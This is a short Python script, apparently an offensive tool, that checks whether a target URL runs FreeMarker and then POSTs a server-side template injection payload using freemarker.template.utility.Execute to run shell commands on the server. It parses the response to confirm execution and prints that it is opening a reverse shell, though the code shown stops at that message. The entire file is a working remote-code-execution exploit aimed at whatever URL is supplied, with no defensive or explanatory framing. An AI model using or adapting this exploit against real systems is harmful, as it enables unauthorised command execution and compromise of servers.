import argparse
import requests
import re

print('Freemarker template injection made by ')
parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument('-u', type=str, dest='url', required=True,
                    help='Url of the target')
parser.add_argument('-d', dest='data', required=True,
                    help='POST variable to inject')

args = parser.parse_args()
try:
    r = requests.get(args.url)

except:
    print('[-]Invalid url')
    exit()

header = r.headers
injection = ['*realbacon*', '*/realbacon*']

if header.get('X-Powered-By') == 'FREEMARKER':
    print(f'[+]Url : {args.url} seems to run with FREEMARKER')
else:
    print(f'[-]Url : {args.url} does not seem to run with FREEMARKER')
    if input('Do you want to continue injection ? (y/n)') == 'n': exit()

print(f'[+]Trying injection with post data : {args.data}')
data_test = {
    args.data: '*realbacon*<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("echo $baconed$") }*/realbacon*'}
payload_test = requests.post(args.url + '/check', data=data_test)


def response(stri):
    a = stri.split('*')
    return "".join(
        a[i + 1]
        for i, n in enumerate(a)
        if n == 'realbacon' and a[i + 1] != 'realbacon'
    )


if response(payload_test.text).strip() == '$baconed$':
    print('[+]Injection successfull\n[+]Opening reverse shell')
else:
    print("g")